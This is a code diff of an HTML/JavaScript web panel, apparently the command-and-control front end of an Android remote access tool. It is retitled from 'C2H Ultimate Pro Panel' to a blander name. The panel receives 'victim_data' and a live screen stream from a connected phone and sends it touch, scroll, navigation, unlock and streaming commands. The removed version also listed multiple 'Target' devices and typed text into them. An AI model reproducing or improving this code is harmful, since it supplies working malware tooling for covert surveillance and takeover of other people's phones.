@@ -3,202 +3,359 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>C2H Ultimate Pro Panel</title>
+    <title>Mobile Control Panel Pro</title>
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #080808; font-family: 'Inter', sans-serif; color: white; }
-        .hidden { display: none !important; }
         
-        /* Device List */
-        #device-list-view { height: 100vh; display: flex; flex-direction: column; padding: 20px; background: radial-gradient(circle at top, #1e293b, #050505); }
-        .device-card { background: rgba(30, 41, 59, 0.4); backdrop-filter: blur(10px); border: 1px solid #1e293b; padding: 18px; border-radius: 20px; margin-bottom: 12px; cursor: pointer; transition: 0.3s; display: flex; align-items: center; justify-content: space-between; }
-        .device-card:active { transform: scale(0.96); background: rgba(59, 130, 246, 0.2); border-color: #3b82f6; }
-        
-        /* Control Panel Layout */
-        .app-container { display: flex; flex-direction: column; height: 100vh; width: 100vw; }
-        .main-content { display: flex; flex: 1; overflow: hidden; }
-        
-        /* Sidebar Controls */
-        .side-controls { width: 75px; background: #000; display: flex; flex-direction: column; align-items: center; gap: 12px; padding: 15px 0; border-right: 1px solid #111; z-index: 50; overflow-y: auto; }
-        .side-btn { width: 50px; height: 50px; border-radius: 15px; background: #111; display: flex; align-items: center; justify-content: center; transition: all 0.2s; font-size: 20px; color: #666; border: 1px solid #222; }
-        .side-btn:active { transform: scale(0.85); background: #3b82f6; color: white; border-color: #3b82f6; }
-        .btn-vol-up { color: #10b981; }
-        .btn-vol-down { color: #ef4444; }
-        .btn-scroll { color: #3b82f6; }
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background-color: #000;
+            font-family: 'Inter', sans-serif;
+            color: white;
+        }
+
+        /* Full Screen Layout */
+        .app-container {
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            width: 100vw;
+        }
+
+        .main-content {
+            display: flex;
+            flex: 1;
+            overflow: hidden;
+        }
+
+        /* Left Side Controls */
+        .side-controls {
+            width: 60px;
+            background: rgba(15, 23, 42, 0.9);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+            padding: 15px 0;
+            border-right: 1px solid #334155;
+            z-index: 50;
+        }
+
+        .side-btn {
+            width: 40px;
+            height: 40px;
+            border-radius: 10px;
+            background: #1e293b;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s;
+            font-size: 16px;
+        }
+
+        .side-btn:active {
+            transform: scale(0.85);
+            background: #3b82f6;
+        }
 
         /* Center Screen View */
-        .screen-view { flex: 1; position: relative; display: flex; flex-direction: column; align-items: center; justify-content: center; background: #000; padding: 10px; }
-        .phone-frame { position: relative; max-width: 100%; max-height: 100%; display: flex; flex-direction: column; align-items: center; border: 8px solid #1a1a1a; border-radius: 35px; padding: 10px; background: #000; box-shadow: 0 0 50px rgba(0,0,0,0.8); }
-        #live-screen { max-width: 100%; max-height: calc(100vh - 200px); object-fit: contain; border-radius: 15px; cursor: crosshair; }
+        .screen-view {
+            flex: 1;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #000;
+        }
+
+        #live-screen {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+            box-shadow: 0 0 20px rgba(59, 130, 246, 0.2);
+        }
+
+        /* Bottom Navigation Bar */
+        .bottom-nav {
+            height: 65px;
+            background: #0f172a;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            border-top: 1px solid #334155;
+            padding-bottom: env(safe-area-inset-bottom);
+        }
+
+        .nav-btn {
+            flex: 1;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 4px;
+            color: #94a3b8;
+        }
+
+        .nav-btn:active {
+            background: rgba(255, 255, 255, 0.05);
+            color: #3b82f6;
+        }
+
+        .nav-btn i { font-size: 20px; }
+        .nav-btn span { font-size: 10px; font-weight: 600; text-transform: uppercase; }
+
+        /* Floating Info Overlays */
+        .top-info {
+            position: absolute;
+            top: 10px;
+            left: 70px;
+            right: 10px;
+            display: flex;
+            justify-content: space-between;
+            pointer-events: none;
+            z-index: 40;
+        }
+
+        .badge {
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(4px);
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+        }
+        .online { background: #10b981; box-shadow: 0 0 5px #10b981; }
+        .offline { background: #ef4444; }
+
+        #coords-overlay {
+            position: absolute;
+            bottom: 10px;
+            right: 10px;
+            font-size: 10px;
+            color: rgba(255, 255, 255, 0.5);
+            pointer-events: none;
+        }
         
-        /* Android Nav Bar */
-        .android-nav { width: 100%; height: 60px; background: #000; display: flex; justify-content: space-around; align-items: center; border-top: 1px solid #111; margin-top: 8px; border-radius: 0 0 25px 25px; }
-        .nav-icon { color: #444; font-size: 22px; padding: 15px 25px; transition: 0.2s; }
-        .nav-icon:active { color: #3b82f6; transform: scale(1.3); }
-
-        /* Bottom Controls (Typing) */
-        .bottom-bar { height: 90px; background: #000; display: flex; align-items: center; padding: 0 20px; gap: 12px; border-top: 1px solid #111; }
-        .type-input { flex: 1; background: #111; border: 1px solid #222; border-radius: 12px; padding: 12px 18px; color: white; outline: none; font-size: 15px; }
-        .type-input:focus { border-color: #3b82f6; }
-        .send-btn { background: #3b82f6; color: white; width: 55px; height: 45px; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 18px; }
-
-        /* Floating Badges */
-        .top-info { position: absolute; top: 20px; left: 95px; right: 20px; display: flex; justify-content: space-between; pointer-events: none; z-index: 40; }
-        .badge { background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(10px); padding: 6px 14px; border-radius: 20px; font-size: 13px; border: 1px solid #222; display: flex; align-items: center; gap: 8px; }
-        .status-dot { width: 8px; height: 8px; border-radius: 50%; background: #10b981; box-shadow: 0 0 10px #10b981; }
+        /* Log Overlay (Minimized by default) */
+        #log-overlay {
+            position: absolute;
+            top: 50px;
+            left: 70px;
+            width: 200px;
+            max-height: 120px;
+            background: rgba(0,0,0,0.7);
+            font-size: 9px;
+            padding: 8px;
+            border-radius: 8px;
+            overflow-y: auto;
+            pointer-events: none;
+            display: none; /* User can toggle if needed */
+        }
     </style>
 </head>
 <body>
 
-    <!-- DEVICE LIST -->
-    <div id="device-list-view">
-        <h1 class="text-3xl font-bold mb-10 flex items-center gap-4 text-white/90">
-            <i class="fas fa-microchip text-blue-500"></i> C2H Control
-        </h1>
-        <div id="devices-container" class="flex-1 overflow-y-auto pr-2">
-            <p class="text-slate-500 text-center mt-20">Scanning network...</p>
-        </div>
-    </div>
-
-    <!-- CONTROL PANEL -->
-    <div id="control-view" class="app-container hidden">
+    <div class="app-container">
+        
+        <!-- Main Content (Sidebars + Screen) -->
         <div class="main-content">
+            
+            <!-- LEFT SIDEBAR: Controls -->
             <div class="side-controls">
-                <button onclick="goBackToList()" class="side-btn text-yellow-500"><i class="fas fa-list-ul"></i></button>
-                <div class="w-10 h-px bg-zinc-900 my-1"></div>
-                <button onclick="sendCommand('unlock_device')" class="side-btn text-blue-400"><i class="fas fa-power-off"></i></button>
-                <button onclick="sendCommand('notifications')" class="side-btn"><i class="fas fa-bell"></i></button>
-                <button onclick="sendCommand('quick_settings')" class="side-btn"><i class="fas fa-cog"></i></button>
-                <div class="w-10 h-px bg-zinc-900 my-1"></div>
-                <!-- Scroll Tools (All Directions) -->
-                <button onclick="sendScroll('up')" class="side-btn btn-scroll"><i class="fas fa-arrow-up"></i></button>
-                <button onclick="sendScroll('down')" class="side-btn btn-scroll"><i class="fas fa-arrow-down"></i></button>
-                <button onclick="sendScroll('left')" class="side-btn btn-scroll"><i class="fas fa-arrow-left"></i></button>
-                <button onclick="sendScroll('right')" class="side-btn btn-scroll"><i class="fas fa-arrow-right"></i></button>
-                <div class="w-10 h-px bg-zinc-900 my-1"></div>
-                <!-- Volume Controls (Plus/Minus) -->
-                <button onclick="sendCommand('volume_up')" class="side-btn btn-vol-up"><i class="fas fa-plus"></i></button>
-                <button onclick="sendCommand('volume_down')" class="side-btn btn-vol-down"><i class="fas fa-minus"></i></button>
+                <button onclick="sendCommand('unlock_device')" class="side-btn text-blue-400" title="Wake">
+                    <i class="fas fa-bolt"></i>
+                </button>
+                <div class="w-8 h-px bg-slate-700 my-1"></div>
+                <button onclick="sendScroll('up')" class="side-btn" title="Scroll Up">
+                    <i class="fas fa-arrow-up"></i>
+                </button>
+                <button onclick="sendScroll('down')" class="side-btn" title="Scroll Down">
+                    <i class="fas fa-arrow-down"></i>
+                </button>
+                <div class="w-8 h-px bg-slate-700 my-1"></div>
+                <button onclick="sendCommand('start_live_stream')" class="side-btn text-green-400" title="Start Stream">
+                    <i class="fas fa-play"></i>
+                </button>
+                <button onclick="sendCommand('stop_live_stream')" class="side-btn text-red-400" title="Stop Stream">
+                    <i class="fas fa-stop"></i>
+                </button>
+                <div class="w-8 h-px bg-slate-700 my-1"></div>
+                <button onclick="toggleLog()" class="side-btn text-slate-400">
+                    <i class="fas fa-terminal"></i>
+                </button>
             </div>
 
+            <!-- CENTER: Live Screen -->
             <div class="screen-view">
                 <div class="top-info">
-                    <div class="badge"><div class="status-dot"></div> <span id="info-model">Target</span></div>
-                    <div class="badge"><i class="fas fa-battery-half text-green-500"></i> <span id="info-battery">--%</span></div>
-                </div>
-
-                <div class="phone-frame">
-                    <img id="live-screen" src="https://via.placeholder.com/1080x1920/000?text=LOAD..." alt="Screen">
-                    
-                    <div class="android-nav">
-                        <button onclick="sendGlobal('back')" class="nav-icon"><i class="fas fa-chevron-left"></i></button>
-                        <button onclick="sendGlobal('home')" class="nav-icon"><i class="far fa-circle"></i></button>
-                        <button onclick="sendGlobal('recents')" class="nav-icon"><i class="far fa-square"></i></button>
+                    <div class="badge">
+                        <div id="status-dot" class="status-dot offline"></div>
+                        <span id="info-model">Connecting...</span>
+                    </div>
+                    <div class="flex gap-2">
+                        <div class="badge"><i class="fas fa-battery-three-quarters"></i> <span id="info-battery">--%</span></div>
+                        <div class="badge"><i class="fas fa-signal"></i> <span id="latency-val">-- ms</span></div>
                     </div>
                 </div>
+
+                <img id="live-screen" src="https://via.placeholder.com/1080x1920/000000/334155?text=WAITING+FOR+DEVICE..." alt="Screen">
+                
+                <div id="coords-overlay">X: 0, Y: 0</div>
+                <div id="log-overlay"></div>
             </div>
+
         </div>
 
-        <div class="bottom-bar">
-            <input type="text" id="type-box" class="type-input" placeholder="Type text to phone...">
-            <button onclick="handleType()" class="send-btn"><i class="fas fa-paper-plane"></i></button>
+        <!-- BOTTOM: Navigation (Like Android) -->
+        <div class="bottom-nav">
+            <button onclick="sendGlobal('back')" class="nav-btn">
+                <i class="fas fa-chevron-left"></i>
+                <span>Back</span>
+            </button>
+            <button onclick="sendGlobal('home')" class="nav-btn">
+                <i class="fas fa-circle"></i>
+                <span>Home</span>
+            </button>
+            <button onclick="sendGlobal('recents')" class="nav-btn">
+                <i class="fas fa-square"></i>
+                <span>Recents</span>
+            </button>
         </div>
+
     </div>
 
     <script>
         const socket = io();
         const screenImg = document.getElementById('live-screen');
-        const typeBox = document.getElementById('type-box');
-        let currentTargetId = null;
-        let screenW = 1080, screenH = 1920;
+        const logOverlay = document.getElementById('log-overlay');
+        
+        let screenW = 1080;
+        let screenH = 1920;
+        let frameCount = 0;
+        let fpsTimer = Date.now();
 
-        socket.on('devices_list', (devices) => {
-            const container = document.getElementById('devices-container');
-            if (devices.length === 0) {
-                container.innerHTML = '<div class="text-center mt-20 text-slate-700">No active sessions.</div>';
-                return;
-            }
-            container.innerHTML = devices.map(dev => `
-                <div class="device-card" onclick="selectDevice('${dev.deviceId}', '${dev.deviceName}')">
-                    <div class="flex items-center gap-4">
-                        <div class="w-14 h-14 rounded-2xl bg-zinc-900 flex items-center justify-center border border-zinc-800">
-                            <i class="fas fa-mobile-alt text-2xl text-blue-500"></i>
-                        </div>
-                        <div>
-                            <div class="font-bold text-lg text-white/90">${dev.deviceName}</div>
-                            <div class="text-xs text-zinc-500 font-mono">${dev.deviceId}</div>
-                        </div>
-                    </div>
-                    <div class="text-right">
-                        <span class="text-[10px] text-green-500 font-bold uppercase tracking-tighter">● Online</span>
-                        <div class="text-sm mt-1 text-zinc-400 font-bold">${dev.battery || '--'}%</div>
-                    </div>
-                </div>
-            `).join('');
+        socket.on('connect', () => {
+            addLog('Connected to Server');
+            document.getElementById('status-dot').className = 'status-dot online';
         });
 
-        function selectDevice(id, name) {
-            currentTargetId = id;
-            document.getElementById('info-model').innerText = name;
-            document.getElementById('device-list-view').classList.add('hidden');
-            document.getElementById('control-view').classList.remove('hidden');
-            socket.emit('panel_command', { targetId: id, type: 'start_live_stream', data: {} });
-        }
+        socket.on('disconnect', () => {
+            addLog('Disconnected');
+            document.getElementById('status-dot').className = 'status-dot offline';
+        });
 
-        function goBackToList() {
-            document.getElementById('control-view').classList.add('hidden');
-            document.getElementById('device-list-view').classList.remove('hidden');
-            currentTargetId = null;
-        }
+        socket.on('victim_data', (data) => {
+            updateInfo(data);
+            addLog(`Device: ${data.deviceName || 'Connected'}`);
+        });
 
         socket.on('live_screen_update', (data) => {
-            if (data.deviceId === currentTargetId && data.liveImage) {
+            if (data.liveImage) {
                 screenImg.src = 'data:image/jpeg;base64,' + data.liveImage;
-                if (data.screenWidth) screenW = data.screenWidth;
-                if (data.screenHeight) screenH = data.screenHeight;
+                if (data.timestamp) {
+                    const latency = Date.now() - data.timestamp;
+                    document.getElementById('latency-val').innerText = `${latency}ms`;
+                }
+                // *** FIX: डिवाइस का आकार भी अपडेट करें ***
+                if (data.screenWidth && data.screenHeight) {
+                    screenW = data.screenWidth;
+                    screenH = data.screenHeight;
+                }
             }
         });
 
         socket.on('status_update', (data) => {
-            if (data.deviceId === currentTargetId && data.battery) {
+            if (data.battery !== undefined) {
                 document.getElementById('info-battery').innerText = `${data.battery}%`;
             }
         });
 
+        // *** FIX: बेहतर टच हैंडलिंग ***
         screenImg.addEventListener('click', (e) => {
-            if (!currentTargetId) return;
             const rect = screenImg.getBoundingClientRect();
-            const x = Math.round(((e.clientX - rect.left) / rect.width) * screenW);
-            const y = Math.round(((e.clientY - rect.top) / rect.height) * screenH);
-            socket.emit('panel_command', { targetId: currentTargetId, type: 'touch_command', data: { x, y } });
+            
+            // 1. इमेज के अंदर क्लिक की गई सापेक्ष स्थिति (0 से 1 के बीच) की गणना करें
+            const clickXRatio = (e.clientX - rect.left) / rect.width;
+            const clickYRatio = (e.clientY - rect.top) / rect.height;
+
+            // 2. इस अनुपात को डिवाइस की वास्तविक स्क्रीन के आकार से गुणा करें
+            const scaledX = Math.round(clickXRatio * screenW);
+            const scaledY = Math.round(clickYRatio * screenH);
+            
+            socket.emit('panel_command', {
+                type: 'touch_command',
+                data: { x: scaledX, y: scaledY }
+            });
+            
+            // Visual feedback
+            showClickRipple(e.clientX, e.clientY);
         });
 
-        function sendCommand(type) {
-            if (!currentTargetId) return;
-            socket.emit('panel_command', { targetId: currentTargetId, type: type, data: {} });
+        function updateInfo(data) {
+            screenW = data.screenWidth || 1080;
+            screenH = data.screenHeight || 1920;
+            document.getElementById('info-model').innerText = data.deviceName || 'Android';
+            if (data.battery) document.getElementById('info-battery').innerText = `${data.battery}%`;
         }
 
         function sendGlobal(action) {
-            if (!currentTargetId) return;
-            socket.emit('panel_command', { targetId: currentTargetId, type: 'global_action', data: { action } });
+            socket.emit('panel_command', { type: 'global_action', data: { action: action } });
         }
 
         function sendScroll(direction) {
-            if (!currentTargetId) return;
-            socket.emit('panel_command', { targetId: currentTargetId, type: 'scroll_action', data: { direction } });
+            socket.emit('panel_command', { type: 'scroll_action', data: { direction: direction } });
         }
 
-        function handleType() {
-            const text = typeBox.value;
-            if (!text || !currentTargetId) return;
-            socket.emit('panel_command', { targetId: currentTargetId, type: 'type_text', data: { text } });
-            typeBox.value = '';
+        function sendCommand(type) {
+            socket.emit('panel_command', { type: type, data: {} });
         }
 
-        typeBox.addEventListener('keypress', (e) => { if(e.key === 'Enter') handleType(); });
+        function toggleLog() {
+            logOverlay.style.display = logOverlay.style.display === 'block' ? 'none' : 'block';
+        }
+
+        function addLog(msg) {
+            const div = document.createElement('div');
+            div.innerText = `[${new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'})}] ${msg}`;
+            logOverlay.appendChild(div);
+            logOverlay.scrollTop = logOverlay.scrollHeight;
+        }
+
+        function showClickRipple(x, y) {
+            const ripple = document.createElement('div');
+            ripple.style.position = 'fixed';
+            ripple.style.left = `${x-10}px`;
+            ripple.style.top = `${y-10}px`;
+            ripple.style.width = '20px';
+            ripple.style.height = '20px';
+            ripple.style.border = '2px solid #3b82f6';
+            ripple.style.borderRadius = '50%';
+            ripple.style.pointerEvents = 'none';
+            ripple.style.zIndex = '9999';
+            ripple.animate([
+                { transform: 'scale(1)', opacity: 1 },
+                { transform: 'scale(3)', opacity: 0 }
+            ], { duration: 400 });
+            document.body.appendChild(ripple);
+            setTimeout(() => ripple.remove(), 400);
+        }
     </script>
 </body>
 </html>
